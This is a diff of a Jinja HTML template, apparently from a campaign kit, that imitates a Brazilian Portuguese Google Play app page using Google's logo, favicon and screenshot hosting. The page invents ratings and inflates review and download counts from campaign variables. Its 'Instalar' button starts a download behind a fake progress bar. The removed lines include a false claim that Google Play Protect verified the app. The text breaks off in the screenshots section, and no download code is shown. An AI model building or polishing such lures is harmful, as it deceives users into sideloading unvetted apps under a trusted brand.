@@ -3,20 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>{{ campaign.app_name }} - Google Play</title>
-    <link rel="icon" type="image/png" href="https://www.gstatic.com/android/market_images/web/favicon_v2.ico">
+    <title>{{ campaign.app_name }} - Apps no Google Play</title>
+    <link rel="icon" type="image/x-icon" href="https://www.gstatic.com/android/market_images/web/favicon_v2.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
             font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
             background: #fff;
             color: #202124;
             -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
-        .header {
+
+        /* ===== HEADER ===== */
+        .top-header {
             background: #fff;
             border-bottom: 1px solid #dadce0;
-            padding: 12px 16px;
+            padding: 8px 16px;
             display: flex;
             align-items: center;
             gap: 12px;
@@ -24,19 +29,37 @@
             top: 0;
             z-index: 100;
         }
-        .header .logo {
-            width: 40px;
-            height: 40px;
+        .google-logo {
+            width: 74px;
+            height: 24px;
+            flex-shrink: 0;
         }
-        .header .search-bar {
+        .nav-links {
+            display: flex;
+            gap: 20px;
+            margin-left: 24px;
             flex: 1;
-            background: #f1f3f4;
-            border-radius: 24px;
-            padding: 10px 16px;
+        }
+        .nav-links a {
+            color: #5f6368;
+            text-decoration: none;
             font-size: 14px;
+            font-weight: 500;
+            padding: 8px 0;
+        }
+        .nav-links a:hover { color: #01875f; }
+        .header-icons {
+            display: flex;
+            gap: 16px;
+            align-items: center;
+        }
+        .header-icon {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
             color: #5f6368;
         }
-        .header .profile {
+        .header-avatar {
             width: 32px;
             height: 32px;
             border-radius: 50%;
@@ -47,44 +70,74 @@
             justify-content: center;
             font-size: 14px;
             font-weight: 500;
+            cursor: pointer;
         }
-        .app-header {
-            padding: 24px 16px;
+
+        /* ===== BREADCRUMB ===== */
+        .breadcrumb {
+            padding: 12px 16px;
+            font-size: 12px;
+            color: #01875f;
+            border-bottom: 1px solid #f1f3f4;
+        }
+        .breadcrumb a {
+            color: #01875f;
+            text-decoration: none;
+        }
+        .breadcrumb a:hover { text-decoration: underline; }
+        .breadcrumb span { color: #5f6368; margin: 0 4px; }
+
+        /* ===== APP HEADER ===== */
+        .app-section {
+            padding: 24px 16px 16px;
             display: flex;
-            gap: 16px;
+            gap: 20px;
             align-items: flex-start;
         }
-        .app-icon {
-            width: 72px;
-            height: 72px;
-            border-radius: 18px;
-            object-fit: cover;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        .app-icon-wrapper {
+            flex-shrink: 0;
         }
-        .app-info {
+        .app-icon {
+            width: 180px;
+            height: 180px;
+            border-radius: 20%;
+            object-fit: cover;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        .app-details {
             flex: 1;
+            padding-top: 8px;
         }
         .app-name {
-            font-size: 20px;
+            font-family: 'Google Sans', sans-serif;
+            font-size: 48px;
             font-weight: 400;
             color: #202124;
+            line-height: 1.2;
             margin-bottom: 4px;
         }
         .app-dev {
-            font-size: 14px;
+            font-size: 16px;
             color: #01875f;
-            margin-bottom: 4px;
+            margin-bottom: 8px;
+            cursor: pointer;
         }
+        .app-dev:hover { text-decoration: underline; }
         .app-meta {
-            font-size: 12px;
+            font-size: 13px;
             color: #5f6368;
+            margin-bottom: 16px;
         }
-        .install-section {
-            padding: 0 16px 16px;
+        .app-meta span { margin-right: 8px; }
+
+        /* ===== INSTALL / PROGRESS BAR ===== */
+        .install-wrapper {
+            margin-bottom: 16px;
         }
+
         .btn-install {
             width: 100%;
-            padding: 12px;
+            padding: 12px 24px;
             background: #01875f;
             color: #fff;
             border: none;
@@ -94,308 +147,455 @@
             text-transform: uppercase;
             cursor: pointer;
             letter-spacing: 0.5px;
+            transition: all 0.2s;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
         }
         .btn-install:hover {
             background: #016d4d;
+            box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
         }
-        .btn-install.installing {
-            background: #5f6368;
+
+        .progress-container {
+            display: none;
+            align-items: center;
+            gap: 12px;
+            background: #f1f3f4;
+            border-radius: 8px;
+            padding: 4px 4px 4px 16px;
+            height: 48px;
         }
+        .progress-container.active {
+            display: flex;
+        }
+
+        .progress-info {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .progress-label {
+            font-size: 12px;
+            color: #5f6368;
+            font-weight: 500;
+        }
+        .progress-track {
+            width: 100%;
+            height: 4px;
+            background: #dadce0;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: #01875f;
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 2px;
+        }
+        .progress-pct {
+            font-size: 12px;
+            color: #5f6368;
+            font-weight: 500;
+            min-width: 36px;
+            text-align: right;
+        }
+        .btn-cancel {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: none;
+            background: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-cancel:hover {
+            background: #e8eaed;
+        }
+        .btn-cancel svg {
+            width: 20px;
+            height: 20px;
+            color: #5f6368;
+        }
+
+        .device-msg {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 16px;
+        }
+        .device-msg svg {
+            width: 20px;
+            height: 20px;
+            color: #5f6368;
+            flex-shrink: 0;
+        }
+
+        /* ===== STATS BAR ===== */
         .stats-bar {
             display: flex;
             justify-content: space-around;
-            padding: 16px;
+            padding: 16px 0;
             border-top: 1px solid #f1f3f4;
             border-bottom: 1px solid #f1f3f4;
         }
         .stat {
             text-align: center;
+            flex: 1;
         }
         .stat-value {
             font-size: 14px;
             font-weight: 500;
             color: #202124;
         }
+        .stat-stars {
+            color: #01875f;
+            font-size: 14px;
+            letter-spacing: 1px;
+        }
         .stat-label {
             font-size: 12px;
             color: #5f6368;
             margin-top: 2px;
         }
-        .screenshots {
-            padding: 16px;
-            overflow-x: auto;
-            white-space: nowrap;
-            -webkit-overflow-scrolling: touch;
+        .stat-divider {
+            width: 1px;
+            background: #dadce0;
+            margin: 4px 0;
         }
-        .screenshots::-webkit-scrollbar { display: none; }
-        .screenshot {
-            width: 200px;
-            height: 356px;
-            background: #f1f3f4;
-            border-radius: 12px;
-            display: inline-block;
-            margin-right: 12px;
-            border: 1px solid #dadce0;
-            position: relative;
-            overflow: hidden;
-        }
-        .screenshot-inner {
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            text-align: center;
-        }
-        .screenshot-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 12px;
-            margin-bottom: 12px;
-            object-fit: cover;
-        }
-        .screenshot-title {
-            font-size: 14px;
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 8px;
-        }
-        .screenshot-text {
-            font-size: 12px;
-            color: #5f6368;
-            line-height: 1.4;
-        }
-        .section {
+
+        /* ===== SHARE ===== */
+        .share-section {
             padding: 16px;
             border-bottom: 1px solid #f1f3f4;
         }
-        .section-title {
-            font-size: 16px;
+        .share-title {
+            font-size: 14px;
             font-weight: 500;
             color: #202124;
             margin-bottom: 12px;
         }
-        .section-text {
-            font-size: 14px;
-            color: #5f6368;
-            line-height: 1.5;
+        .share-buttons {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
         }
-        .reviews {
-            padding: 16px;
+        .share-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 20px;
+            background: #fff;
+            font-size: 13px;
+            color: #3c4043;
+            cursor: pointer;
+            transition: all 0.2s;
         }
-        .rating-big {
-            font-size: 48px;
-            font-weight: 300;
+        .share-btn:hover {
+            background: #f8f9fa;
+            border-color: #bdc1c6;
+        }
+        .share-btn svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* ===== SCREENSHOTS ===== */
+        .screenshots-section {
+            padding: 24px 0;
+            border-bottom: 1px solid #f1f3f4;
+        }
+        .section-header {
+            padding: 0 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        .section-title {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 20px;
+            font-weight: 500;
             color: #202124;
         }
-        .stars {
+        .section-link {
+            font-size: 14px;
+            color: #01875f;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .section-link:hover { text-decoration: underline; }
+
+        .screenshots-scroll {
+            display: flex;
+            gap: 12px;
+            padding: 0 16px;
+            overflow-x: auto;
+            scroll-snap-type: x mandatory;
+            -webkit-overflow-scrolling: touch;
+        }
+        .screenshots-scroll::-webkit-scrollbar { display: none; }
+        .screenshot {
+            flex-shrink: 0;
+            width: 280px;
+            height: 500px;
+            border-radius: 16px;
+            overflow: hidden;
+            scroll-snap-align: start;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3);
+        }
+        .screenshot img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* ===== ABOUT ===== */
+        .about-section {
+            padding: 24px 16px;
+            border-bottom: 1px solid #f1f3f4;
+        }
+        .about-text {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+        .about-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .tag {
+            padding: 6px 12px;
+            background: #f1f3f4;
+            border-radius: 16px;
+            font-size: 12px;
+            color: #3c4043;
+        }
+
+        /* ===== RATINGS ===== */
+        .ratings-section {
+            padding: 24px 16px;
+            border-bottom: 1px solid #f1f3f4;
+        }
+        .ratings-header {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+        .rating-big {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 64px;
+            font-weight: 400;
+            color: #202124;
+            line-height: 1;
+        }
+        .rating-info {
+            flex: 1;
+        }
+        .stars-big {
             color: #01875f;
             font-size: 20px;
             letter-spacing: 2px;
+            margin-bottom: 4px;
         }
         .review-count {
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .rating-bars {
+            flex: 1;
+            max-width: 300px;
+        }
+        .rating-bar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 6px;
+        }
+        .rating-bar-num {
             font-size: 12px;
             color: #5f6368;
-            margin-top: 4px;
+            width: 12px;
+            text-align: right;
         }
-        .footer {
-            padding: 24px 16px;
-            text-align: center;
-            font-size: 12px;
-            color: #5f6368;
-            border-top: 1px solid #f1f3f4;
-        }
-        .google-logo {
-            width: 74px;
-            height: 24px;
-            margin-bottom: 8px;
-        }
-        .progress-bar {
-            width: 100%;
-            height: 4px;
+        .rating-bar-track {
+            flex: 1;
+            height: 8px;
             background: #e8eaed;
-            border-radius: 2px;
-            margin-top: 12px;
+            border-radius: 4px;
             overflow: hidden;
-            display: none;
         }
-        .progress-fill {
+        .rating-bar-fill {
             height: 100%;
             background: #01875f;
-            width: 0%;
-            transition: width 0.3s;
+            border-radius: 4px;
         }
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.5);
-            z-index: 1000;
-            justify-content: center;
+        .rating-bar-pct {
+            font-size: 12px;
+            color: #5f6368;
+            width: 32px;
+        }
+
+        /* ===== REVIEWS ===== */
+        .reviews-list {
+            margin-top: 24px;
+        }
+        .review-item {
+            padding: 16px 0;
+            border-bottom: 1px solid #f1f3f4;
+        }
+        .review-header {
+            display: flex;
             align-items: center;
-        }
-        .modal {
-            background: #fff;
-            border-radius: 16px;
-            padding: 24px;
-            width: 90%;
-            max-width: 320px;
-            text-align: center;
-        }
-        .modal-icon {
-            width: 56px;
-            height: 56px;
-            border-radius: 14px;
-            margin-bottom: 16px;
-        }
-        .modal-title {
-            font-size: 18px;
-            font-weight: 500;
+            gap: 12px;
             margin-bottom: 8px;
         }
-        .modal-text {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 20px;
-        }
-        .modal-btn {
-            width: 100%;
-            padding: 12px;
-            background: #01875f;
+        .review-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #1a73e8;
             color: #fff;
-            border: none;
-            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 14px;
             font-weight: 500;
+        }
+        .review-meta {
+            flex: 1;
+        }
+        .review-name {
+            font-size: 14px;
+            font-weight: 500;
+            color: #202124;
+        }
+        .review-stars {
+            color: #01875f;
+            font-size: 12px;
+        }
+        .review-date {
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .review-text {
+            font-size: 14px;
+            color: #3c4043;
+            line-height: 1.5;
+            margin-left: 48px;
+        }
+        .review-helpful {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-top: 12px;
+            margin-left: 48px;
+        }
+        .helpful-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            color: #5f6368;
             cursor: pointer;
         }
+        .helpful-btn svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* ===== AGE RATING ===== */
+        .age-section {
+            padding: 24px 16px;
+            border-bottom: 1px solid #f1f3f4;
+        }
+        .age-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+        .age-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            background: #34a853;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 700;
+        }
+        .age-text {
+            font-size: 14px;
+            color: #202124;
+            font-weight: 500;
+        }
+        .age-sub {
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            padding: 32px 16px;
+            text-align: center;
+            background: #f8f9fa;
+        }
+        .google-play-logo {
+            width: 120px;
+            height: 40px;
+            margin-bottom: 12px;
+        }
+        .footer-text {
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 16px;
+        }
+        .footer-links a {
+            font-size: 12px;
+            color: #5f6368;
+            text-decoration: none;
+        }
+        .footer-links a:hover { text-decoration: underline; }
+
+        /* ===== MOBILE ===== */
+        @media (max-width: 768px) {
+            .nav-links { display: none; }
+            .app-section { flex-direction: column; align-items: center; text-align: center; }
+            .app-icon { width: 120px; height: 120px; }
+            .app-name { font-size: 28px; }
+            .ratings-header { flex-direction: column; align-items: flex-start; }
+            .rating-bars { max-width: 100%; width: 100%; margin-top: 16px; }
+            .screenshot { width: 200px; height: 356px; }
+        }
     </style>
+<base target="_blank">
 </head>
 <body>
-    <div class="header">
-        <svg class="logo" viewBox="0 0 40 40">
-            <path fill="#EA4335" d="M20 0C8.96 0 0 8.96 0 20s8.96 20 20 20 20-8.96 20-20S31.04 0 20 0z"/>
-            <path fill="#fff" d="M13 27.5v-15l12.5 7.5L13 27.5z"/>
-        </svg>
-        <div class="search-bar">Pesquisar na Play Store</div>
-        <div class="profile">L</div>
-    </div>
-
-    <div class="app-header">
-        <img src="{{ icon_url }}" class="app-icon" alt="{{ campaign.app_name }}">
-        <div class="app-info">
-            <div class="app-name">{{ campaign.app_name }}</div>
-            <div class="app-dev">{{ campaign.package_name.split(".")[1]|title if campaign.package_name else "Official" }}</div>
-            <div class="app-meta">Contém anúncios • Compras no app</div>
-        </div>
-    </div>
-
-    <div class="install-section">
-        <button class="btn-install" id="installBtn" onclick="installApp()">Instalar</button>
-        <div class="progress-bar" id="progressBar">
-            <div class="progress-fill" id="progressFill"></div>
-        </div>
-    </div>
-
-    <div class="stats-bar">
-        <div class="stat">
-            <div class="stat-value">4.8</div>
-            <div class="stat-label">&#9733; &#9733; &#9733; &#9733; &#9734;</div>
-        </div>
-        <div class="stat">
-            <div class="stat-value">{{ campaign.download_count + 50000 }}M+</div>
-            <div class="stat-label">Downloads</div>
-        </div>
-        <div class="stat">
-            <div class="stat-value">{{ campaign.download_count // 1000 + 1 }}M</div>
-            <div class="stat-label">Avaliações</div>
-        </div>
-        <div class="stat">
-            <div class="stat-value">Livre</div>
-            <div class="stat-label">Classificação</div>
-        </div>
-    </div>
-
-    <div class="screenshots">
-        <div class="screenshot">
-            <div class="screenshot-inner">
-                <img src="{{ icon_url }}" class="screenshot-icon">
-                <div class="screenshot-title">Bem-vindo</div>
-                <div class="screenshot-text">Acesse todos os recursos premium de forma rápida e segura.</div>
-            </div>
-        </div>
-        <div class="screenshot">
-            <div class="screenshot-inner">
-                <img src="{{ icon_url }}" class="screenshot-icon">
-                <div class="screenshot-title">Interface Intuitiva</div>
-                <div class="screenshot-text">Design moderno e fácil de usar para todos os usuários.</div>
-            </div>
-        </div>
-        <div class="screenshot">
-            <div class="screenshot-inner">
-                <img src="{{ icon_url }}" class="screenshot-icon">
-                <div class="screenshot-title">100% Seguro</div>
-                <div class="screenshot-text">Proteção de dados e privacidade garantida.</div>
-            </div>
-        </div>
-    </div>
-
-    <div class="section">
-        <div class="section-title">Sobre este app</div>
-        <div class="section-text">
-            {{ campaign.app_name }} é o aplicativo oficial que permite acesso rápido e seguro a todos os serviços. 
-            Com interface moderna e atualizações constantes, oferecemos a melhor experiência para nossos usuários.
-            Baixe agora e aproveite todos os recursos disponíveis.
-        </div>
-    </div>
-
-    <div class="reviews">
-        <div class="section-title">Avaliações e resenhas</div>
-        <div style="display: flex; align-items: center; gap: 24px; margin-top: 16px;">
-            <div>
-                <div class="rating-big">4.8</div>
-                <div class="stars">&#9733;&#9733;&#9733;&#9733;&#9734;</div>
-                <div class="review-count">{{ campaign.download_count // 1000 + 1 }}M avaliações</div>
-            </div>
-            <div style="flex: 1;">
-                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px;">
-                    <span style="font-size: 12px; color: #5f6368;">5</span>
-                    <div style="flex: 1; height: 8px; background: #e8eaed; border-radius: 4px;">
-                        <div style="width: 85%; height: 100%; background: #01875f; border-radius: 4px;"></div>
-                    </div>
-                </div>
-                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px;">
-                    <span style="font-size: 12px; color: #5f6368;">4</span>
-                    <div style="flex: 1; height: 8px; background: #e8eaed; border-radius: 4px;">
-                        <div style="width: 10%; height: 100%; background: #01875f; border-radius: 4px;"></div>
-                    </div>
-                </div>
-                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px;">
-                    <span style="font-size: 12px; color: #5f6368;">3</span>
-                    <div style="flex: 1; height: 8px; background: #e8eaed; border-radius: 4px;">
-                        <div style="width: 3%; height: 100%; background: #01875f; border-radius: 4px;"></div>
-                    </div>
-                </div>
-                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px;">
-                    <span style="font-size: 12px; color: #5f6368;">2</span>
-                    <div style="flex: 1; height: 8px; background: #e8eaed; border-radius: 4px;">
-                        <div style="width: 1%; height: 100%; background: #01875f; border-radius: 4px;"></div>
-                    </div>
-                </div>
-                <div style="display: flex; align-items: center; gap: 8px;">
-                    <span style="font-size: 12px; color: #5f6368;">1</span>
-                    <div style="flex: 1; height: 8px; background: #e8eaed; border-radius: 4px;">
-                        <div style="width: 1%; height: 100%; background: #01875f; border-radius: 4px;"></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="footer">
+    <!-- HEADER -->
+    <div class="top-header">
         <svg class="google-logo" viewBox="0 0 74 24">
             <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"/>
             <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
@@ -404,56 +604,359 @@
             <path fill="#34A853" d="M58 .24h2.51v17.57H58z"/>
             <path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
         </svg>
-        <div>Google Play</div>
-        <div style="margin-top: 8px;">Passionate about quality apps.</div>
+        <div class="nav-links">
+            <a href="#">Jogos</a>
+            <a href="#">Apps</a>
+            <a href="#">Filmes</a>
+            <a href="#">Livros</a>
+            <a href="#">Crianças</a>
+        </div>
+        <div class="header-icons">
+            <svg class="header-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="11" cy="11" r="8"/>
+                <path d="m21 21-4.3-4.3"/>
+            </svg>
+            <svg class="header-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="12" cy="12" r="10"/>
+                <path d="M12 16v-4M12 8h.01"/>
+            </svg>
+            <div class="header-avatar">L</div>
+        </div>
     </div>
 
-    <div class="modal-overlay" id="installModal">
-        <div class="modal">
-            <img src="{{ icon_url }}" class="modal-icon">
-            <div class="modal-title">{{ campaign.app_name }}</div>
-            <div class="modal-text">Este app foi verificado pela Google Play Protect e está pronto para instalação.</div>
-            <button class="modal-btn" onclick="startDownload()">Continuar</button>
+    <!-- BREADCRUMB -->
+    <div class="breadcrumb">
+        <a href="#">Apps</a>
+        <span>›</span>
+        <a href="#">Serviços e Informações do Brasil</a>
+    </div>
+
+    <!-- APP SECTION -->
+    <div class="app-section">
+        <div class="app-icon-wrapper">
+            <img src="{{ icon_url }}" class="app-icon" alt="{{ campaign.app_name }}">
+        </div>
+        <div class="app-details">
+            <div class="app-name">{{ campaign.app_name }}</div>
+            <div class="app-dev">{{ campaign.package_name.split('.')[1]|title if campaign.package_name else 'Official' }}</div>
+            <div class="app-meta">
+                <span>Contém anúncios</span>
+                <span>•</span>
+                <span>Compras no app</span>
+            </div>
+
+            <!-- INSTALL / PROGRESS -->
+            <div class="install-wrapper">
+                <button class="btn-install" id="installBtn" onclick="startDownload()">Instalar</button>
+
+                <div class="progress-container" id="progressContainer">
+                    <div class="progress-info">
+                        <div class="progress-label" id="progressLabel">Baixando...</div>
+                        <div class="progress-track">
+                            <div class="progress-fill" id="progressFill"></div>
+                        </div>
+                    </div>
+                    <div class="progress-pct" id="progressPct">0%</div>
+                    <button class="btn-cancel" id="cancelBtn" onclick="cancelDownload()" title="Cancelar">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                            <line x1="18" y1="6" x2="6" y2="18"/>
+                            <line x1="6" y1="6" x2="18" y2="18"/>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <div class="device-msg">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
+                    <line x1="12" y1="18" x2="12.01" y2="18"/>
+                </svg>
+                <span>Este app está disponível para alguns dos seus dispositivos</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- STATS -->
+    <div class="stats-bar">
+        <div class="stat">
+            <div class="stat-value">4,8</div>
+            <div class="stat-stars">★★★★☆</div>
+            <div class="stat-label">{{ (campaign.download_count // 1000 + 4530) }} mi avaliações</div>
+        </div>
+        <div class="stat-divider"></div>
+        <div class="stat">
+            <div class="stat-value" style="display: flex; align-items: center; justify-content: center; gap: 4px;">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="#5f6368">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+                </svg>
+            </div>
+            <div class="stat-label">50 mi+</div>
+            <div class="stat-label">Downloads</div>
+        </div>
+        <div class="stat-divider"></div>
+        <div class="stat">
+            <div class="stat-value" style="font-size: 20px; font-weight: 700; color: #34a853;">L</div>
+            <div class="stat-label">Classificação</div>
+            <div class="stat-label">Livre</div>
+        </div>
+    </div>
+
+    <!-- SHARE -->
+    <div class="share-section">
+        <div class="share-title">Compartilhar este app</div>
+        <div class="share-buttons">
+            <button class="share-btn">
+                <svg viewBox="0 0 24 24" fill="#25D366"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+                WhatsApp
+            </button>
+            <button class="share-btn">
+                <svg viewBox="0 0 24 24" fill="#0088cc"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.479.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+                Telegram
+            </button>
+            <button class="share-btn">
+                <svg viewBox="0 0 24 24" fill="#EA4335"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                Email
+            </button>
+            <button class="share-btn">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+                Copiar link
+            </button>
+        </div>
+    </div>
+
+    <!-- SCREENSHOTS -->
+    <div class="screenshots-section">
+        <div class="section-header">
+            <div class="section-title">Imagens do app</div>
+            <a href="#" class="section-link">Ver tudo</a>
+        </div>
+        <div class="screenshots-scroll">
+            <div class="screenshot">
+                <img src="https://play-lh.googleusercontent.com/Oq0FMXa_BEoMfF4DSNH3YItNx0au7hHNEvzUNqFfVeSiqJwRyEnV492aGW6MBflG6O2kXU0JGqV7xkdmfDcybw=w526-h296-rw" alt="Screenshot 1">
+            </div>
+            <div class="screenshot">
